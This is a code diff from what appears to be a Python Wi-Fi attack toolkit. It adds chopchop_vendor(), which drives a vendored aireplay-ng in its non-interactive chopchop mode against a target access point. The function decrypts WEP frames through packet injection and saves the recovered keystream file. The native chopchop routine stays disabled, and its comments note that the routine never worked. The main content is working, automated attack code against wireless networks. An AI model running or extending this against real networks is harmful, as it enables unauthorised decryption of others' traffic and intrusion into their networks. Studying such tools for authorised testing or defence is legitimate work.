@@ -15,28 +15,31 @@ path is identical.
 
 Chopchop
 --------
-Decrypt one WEP-encrypted frame byte-by-byte using the AP as an ICV
-oracle: truncate the frame by one byte, adjust the CRC-32 ICV under a
-byte guess, inject the result; if the AP forwards/ACKs it the guess was
-right.  Full decryption takes ≤256 × len(payload) injections.
-
-⚠  Chopchop timing is hardware-dependent.  The oracle detection (AP
-retransmit visible in monitor mode within _ORACLE_WINDOW seconds) may
-need tuning per environment.  If the oracle fires on wrong guesses
-(false-positive environment), lower _ORACLE_WINDOW.
+The native from-scratch approach below (decrypt one WEP-encrypted frame
+byte-by-byte using the AP as an ICV oracle) is disabled — its ICV-correction
+math never worked against real RC4 encryption (see the comment above
+chopchop()).  chopchop_vendor() drives this project's own vendored/
+self-compiled aircrack-ng's real -4/--chopchop mode instead; that's the one
+actually in use.
 """
 
 from __future__ import annotations
 
+import shutil
+import subprocess
+import tempfile
 import threading
 import time
+from pathlib import Path
 
 from scapy.layers.dot11 import Dot11, Dot11WEP
 from scapy.packet import Packet
 from scapy.sendrecv import sendp, sniff
 
+from ..cli_commands import CHOPCHOP_BIN
 from ..frames import with_forced_rate
 from ..radio import ensure_channel
+from ..storage import organized_output_path
 from ..wep.crypto import recover_keystream
 from ..wep.ptw import PTWVoteTable, compute_key
 from .wep import (
@@ -202,10 +205,8 @@ def hirte(
 # The real fix: this project already vendors and compiles a working
 # chopchop implementation (vendor/aircrack-ng, wired to `-4`/`--chopchop`)
 # — the same self-built binary this project already uses elsewhere in
-# cli.py, not a third-party tool being wrapped as a fallback. Driving it
-# (it prompts interactively for "use this packet?"/keeps candidate
-# frames) needs live hardware to get the interaction right, so it's not
-# attempted here.
+# cli.py, not a third-party tool being wrapped as a fallback. See
+# chopchop_vendor() below — it drives that binary instead of this function.
 
 
 def chopchop(
@@ -224,13 +225,83 @@ def chopchop(
     The native ICV-correction math never worked correctly (confirmed via
     two independent offline tests, not just a live failure), so this raises
     instead of running a guess loop that could never succeed against a real
-    AP. This project's own vendored/self-compiled injection engine already
-    has a real, working chopchop attack — use that until this is properly
-    reimplemented or driven from here.
+    AP. Use chopchop_vendor() below instead — it drives this project's own
+    vendored/self-compiled aircrack-ng binary's real chopchop attack.
     """
     raise NotImplementedError(
         "chopchop is disabled: its WEP ICV-correction math doesn't work "
         "through RC4 encryption (verified offline, not just untested) — see "
-        "the comment above this function. This project's own vendored "
-        "injection engine already has a working chopchop attack."
+        "the comment above this function. Use chopchop_vendor() instead — "
+        "it drives this project's own vendored aircrack-ng chopchop attack."
     )
+
+
+def chopchop_vendor(
+    iface: str,
+    bssid: str,
+    own_mac: str,
+    channel: int | None = None,
+    timeout: float = 300.0,
+    stop_event: threading.Event | None = None,
+    progress_fn=None,
+) -> Path | None:
+    """Recover WEP plaintext/keystream via the vendored aireplay-ng's real
+    -4/--chopchop mode — this is the working replacement for chopchop()
+    above (see that function's docstring for why the native attempt is
+    disabled).
+
+    `-F` picks the first matching WEP data packet automatically instead of
+    prompting "Use this packet ? y/n" — that interactive prompt was the
+    reason wiring the vendored binary in was previously left as future
+    work. With it gone the whole run is a single bounded, non-interactive
+    subprocess: no live stdin handling needed.
+
+    chopchop reveals plaintext/keystream, not the WEP key itself (that's
+    inherent to the attack, not a limitation of this wiring) — returns the
+    path to the recovered `.xor` PRGA file on success, or None if
+    aireplay-ng never got a candidate packet accepted before timeout/stop.
+    Requires a genuine WEP AP with WEP data traffic; against WPA/WPA2 or a
+    silent target this will just run out the clock.
+    """
+    ensure_channel(iface, channel)
+    outdir = Path(tempfile.mkdtemp(prefix="atwa-chopchop-"))
+    cmd = [str(CHOPCHOP_BIN), "-4", "-F", "-b", bssid, "-h", own_mac, iface]
+
+    if progress_fn is not None:
+        progress_fn(f"chopchop: driving vendored aireplay-ng -4 against {bssid}")
+
+    proc = subprocess.Popen(
+        cmd, cwd=outdir, stdin=subprocess.DEVNULL,
+        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
+    )
+    deadline = time.monotonic() + timeout
+    try:
+        while proc.poll() is None:
+            if time.monotonic() > deadline or (stop_event is not None and stop_event.is_set()):
+                proc.terminate()
+                try:
+                    proc.wait(timeout=5)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                break
+            time.sleep(1.0)
+    finally:
+        if proc.poll() is None:
+            proc.kill()
+            proc.wait()
+
+    output = proc.stdout.read() if proc.stdout else ""
+    if progress_fn is not None and output.strip():
+        progress_fn(f"chopchop: aireplay-ng output tail:\n{output.strip()[-500:]}")
+
+    xor_files = sorted(outdir.glob("replay_dec-*.xor"))
+    if not xor_files:
+        if progress_fn is not None:
+            progress_fn("chopchop: no packet decrypted (AP rejected every candidate, or none seen before timeout)")
+        return None
+
+    dest = organized_output_path("chopchop", f"{bssid.replace(':', '-')}.xor")
+    shutil.copyfile(xor_files[-1], dest)
+    if progress_fn is not None:
+        progress_fn(f"chopchop: recovered keystream saved to {dest}")
+    return dest
